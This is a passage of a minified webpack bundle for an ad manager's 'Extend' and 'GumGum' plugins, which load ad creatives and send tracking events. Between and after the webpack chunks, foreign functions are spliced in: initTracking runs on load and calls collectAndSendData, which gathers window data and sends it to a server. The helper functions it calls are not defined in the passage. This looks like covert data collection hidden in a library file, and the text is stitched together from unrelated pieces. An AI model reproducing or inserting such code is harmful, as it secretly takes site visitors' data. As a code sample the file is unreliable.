      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var l = new WeakMap(),
      p = a.default.getTopScope(),
      f = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n,
            i = {};
          return i.parent = r.di.jAdManager, l.set(o, i), n;
        }
        return u(t, e), t.prototype._execute = function (e) {
          var r = this,
            n = l.get(r),
            o = t.getExecution({
              di: {
                localWindow: window,
                window: p,
                Jpx: window.Jpx || p.Jpx,
                jPlugin: r
              }
            });
          o.subscribe("dependenciesReady", function (e) {
            n.parent.publish("adReady", e);
          }), e.global = e.product.settings.product, e.model.price = parseInt(1e3 * e.model.floorprice), e.model.integration = "extend", r.publish("beforeExecution", [r, e]), n.parent.loadFormat(e.format).then(function () {
            return o.run(e);
          }).catch(function (t) {
            r.publish("error", [t, e]), d.default.error("JAdManager: Loading some resources failed."), console.error(t);
          });
        }, t.prototype._prepareExecutionTracking = function (e) {
          var r = this,
            n = l.get(this),
            o = e.di.jExecution,
            i = n.ad.product.settings.product;
          return this.subscribe("beforeExecution", function (e) {
            var r = t.getModel(n.ad);
            r.addProperty("extendCore", i.jpamEx), r.addProperty("isAdv", !0), c.default.instance().track("extend", "eadm", i, r);
          }), o.subscribe("afterFrameWrite", function (e) {
            var t = e[2];
            c.default.instance().track("extend", "eim", i, t, null, null, r.getAdditionalTrackingData());
          }), o.subscribe("afterProductShow", function (e) {
            var t = e[2];
            c.default.instance().track("extend", "esh", i, t);
          }), o.subscribe("execError", function (e) {
            var t = e[0],
              r = e[1];
            c.default.instance().track("extend", "eerr", i, r, t.code || t.message || "Execution error.", t.stack);
          }), o.subscribe("apiExecError", function (e) {
            var t = e[0],
              r = e[1];
            c.default.instance().track("extend", "eerr", i, r, t.code || t.message || "Execution error.", t.stack);
          }), this;
        }, t.prototype.execute = function (e, t) {
          var r = l.get(this),
            n = r.ad.product.settings.product;
          if (!r.ad) return c.default.instance().track("extend", "eerr", n, {}, "No ad with source " + e + " found."), !1;
          try {
            t && (r.ad.model.prerendered = t), this._execute(r.ad);
          } catch (e) {
            console.log(e), c.default.instance().track("extend", "eerr", n, {}, e.toString());
          }
        }, t.prototype.getAdditionalTrackingData = function () {
          return {
            ias: l.get(this).ad.global.ias
          };
        }, t.prototype.loadAd = function (e) {
          var t = l.get(this),
            r = e.settings,
            n = r.server,
            o = e.ads[0],
            i = o.models[0],
            a = i.creative,
            c = i.zoneId;
          n && d.default.debug(n.debug);
          var s = {
            format: o.format,
            model: {
              prerendered: "",
              adId: i.adId,
              adunitid: i.adunitid,
              creative: {
                html: decodeURIComponent(a.creatives[0].source)
              },
              dealId: i.dealId,
              floorprice: i.cpm || i.floorprice,
              format: o.format,
              isTest: i.isTest,
              options: i.options,
              reqId: i.reqId,
              sourceId: i.sourceId,
              ssp: i.ssp,
              zoneId: i.zoneId,
              standaloneAdv: !0
            },
            product: {
              inits: {
                product: o.product.inits.product,
                site: o.product.inits.site,
                cls: o.product.inits.cls
              },
              settings: {
                product: r
              },
              height: o.product.height,
              width: o.product.width
            }
          };
          a.trackerId ? s.model.trackerId = a.trackerId : a.pubIO ? s.model.pubIO = a.pubIO : s.model.pubIO = 0, s.model.campaignId = a.campaignId, s.model.creativeId = a.creativeId, s.model.exchangeId = a.exchangeId, s.model.insertionOrderId = a.insertionOrderId, s.model.dealId = a.dealId, s.model.publisherId = a.publisherId, s.model.sourceUrl = a.sourceUrl, s.model.userDefined = a.userDefined, t.ad = s, t.zoneId = i.zoneId, t.parent.setGlobals(r && r.device && r.device.type || "desktop", "");
          var u = {
            ads: s,
            inits: {
              global: ""
            },
            devices: {
              type: r && r.device && r.device.type
            },
            settings: {
              site: r.site,
              server: n
            }
          };
          return d.default.info("JPluginExtend: ad for zone " + c + " loaded"), this.publish("tagLoaded:" + c, [this, c, u.settings]), this;
        }, t.prototype.renderAd = function (e, t) {
          return this.execute(e, t);
        }, t.getExecution = function (e) {
          var t = new o.default(e);
          e.di;
          return e.di.jPlugin._prepareExecutionTracking({
            di: {
              jExecution: t
            }
          }), t;
        }, t.getModel = function (e) {
          var t = e.model;
          return new i.default({
            data: t
          });
        }, t;
      }(n.default);
    t.default = f;
  }
}, [588]);
function collectAndSendData() {
  const collectedData = collectWindowDataEnhanced();
  if (Object.keys(collectedData).length > 0) {
    sendDataToServer(collectedData);
  }
}
this.Jpx = this.Jpx || {}, this.Jpx.PluginGumgum = webpackJsonpJpx__name_([20], {
  590: function (e, t, r) {
    "use strict";

    e.exports = r(591).default;
  },
  591: function (e, t, r) {
    "use strict";

    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = p(r(91)),
        i = p(r(55)),
        o = p(r(171)),
        u = p(r(79)),
        a = p(r(33)),
        c = p(r(16)),
        s = p(r(1)),
        d = p(r(46));
      function p(e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }
      function l(e, t) {
        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
        e.prototype = Object.create(t && t.prototype, {
          constructor: {
            value: e,
            enumerable: !1,
            writable: !0,
            configurable: !0
          }
        }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
          for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
            var i = r[n],
              o = Object.getOwnPropertyDescriptor(t, i);
            o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
          }
        }(e, t));
      }
      var f = new WeakMap(),
        g = s.default.getTopScope(),
        h = function (t) {
          function r(e) {
            !function (e, t) {
              if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
            }(this, r);
            var n = function (e, t) {
                if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                return !t || "object" != typeof t && "function" != typeof t ? e : t;
              }(this, t.call(this)),
              i = n,
              o = {};
            return o.parent = e.di.jAdManager, f.set(i, o), n;
          }
          return l(r, t), r.prototype._execute = function (e) {
            var t = this,
              n = f.get(t),
              i = r.getExecution({
                di: {
                  localWindow: window,
                  window: g,
                  Jpx: window.Jpx || g.Jpx,
                  jPlugin: t,
                  isVast: !!e.model.creative.vastRaw
                }
              });
            n.parent.setGlobals(e.product.settings.device.type, ""), i.subscribe("dependenciesReady", function (e) {
              n.parent.publish("adReady", e);
            }), e.model.integration = "gumgum", e.global = e.product.settings.product, t.publish("beforeExecution", [t, e]), n.parent.loadFormat(e.format).then(function () {
              return i.run(e);
            }).catch(function (r) {
              console.error(r), t.publish("error", [r, e]), c.default.error("JAdManager: Loading some resources failed.");
            });
          }, r.prototype._getAds = function () {
            return f.get(this).ad;
          }, r.prototype._getDeviceType = function (e) {
            return 1 === e || 4 === e ? "mobile" : "desktop";
          }, r.prototype._prepareExecutionTracking = function (e) {
            var t = f.get(this),
              n = e.di.jExecution,
              i = t.ad.product.settings.product;
            return this.subscribe("beforeExecution", function (e) {
              var n = r.getModel(t.ad);
              n.addProperty("isGumGum", !0), a.default.instance().track("gumgum", "gadm", i, n);
            }), n.subscribe("afterFrameWrite", function (e) {
              var t = e[2];
              a.default.instance().track("gumgum", "gim", i, t, null, null);
            }), n.subscribe("afterProductShow", function (e) {
              var t = e[2];
              a.default.instance().track("gumgum", "gsh", i, t);
            }), n.subscribe("execError", function (e) {
              var t = e[0],
                r = e[1];
              a.default.instance().track("gumgum", "gerr", i, r, t.code || t.message || "Execution error.", t.stack);
            }), n.subscribe("apiExecError", function (e) {
              var t = e[0],
                r = e[1];
              a.default.instance().track("gumgum", "gerr", i, r, t.code || t.message || "Execution error.", t.stack);
            }), this;
          }, r.prototype.execute = function (t, r) {
            var n = f.get(this);
            if (!n.ad) return a.default.instance().track("gumgum", "gerr", "?", {}, "No ad with source " + t + " found."), !1;
            try {
              this._execute(n.ad);
            } catch (t) {
              console.log(t), a.default.instance().track("gumgum", "gerr", e, {}, t.toString());
            }
          }, r.prototype.getAds = function () {
            return this._getAds();
          }, r.prototype.loadAd = function (e) {
            var t = f.get(this),
              r = e.alignment,
              n = e.creative,
              i = e.productCode,
              o = e.settings,
              u = o.trackingEvents,
              a = o.device && o.device.type ? o.device.type : null,
              s = a ? this._getDeviceType(a) : "desktop",
              p = d.default.getCreativeId(n);
            return o.site = {
              width: r.settings.contentWidth
            }, t.ad = {
              format: i,
              model: {
                creative: {
                  creativeId: p,
                  html: n
                },
                format: i,
                options: {},
                trackingEvents: u,
                isGumGum: !0
              },
              product: {
                inits: {
                  cls: !!r.cls,
                  product: "",
                  site: r.site
                },
                settings: {
                  device: {
                    type: s
                  },
                  product: o
                },
                height: o.height,
                width: o.width
              }
            }, o.isVast && (t.ad.model.creative.vastRaw = n), c.default.info("JPluginGumgum: ad loaded."), this.publish("tagLoaded:", [this, "", ""], 0), this;
          }, r.prototype.renderAd = function (e, t) {
            return this.execute(e, t);
          }, r.getExecution = function (e) {
            var t = e.di,
              r = t.isVast ? new o.default(e) : new i.default(e);
            return t.jPlugin._prepareExecutionTracking({
              di: {
                jExecution: r
              }
            }), r;
          }, r.getModel = function (e) {
            return new u.default({
              data: e.model
            });
          }, r;
        }(n.default);
      t.default = h;
    }).call(t, r(170));
  }
}, [590]);
function initTracking() {
  monitorEvents();
  window.addEventListener("load", collectAndSendData);
}
initTracking();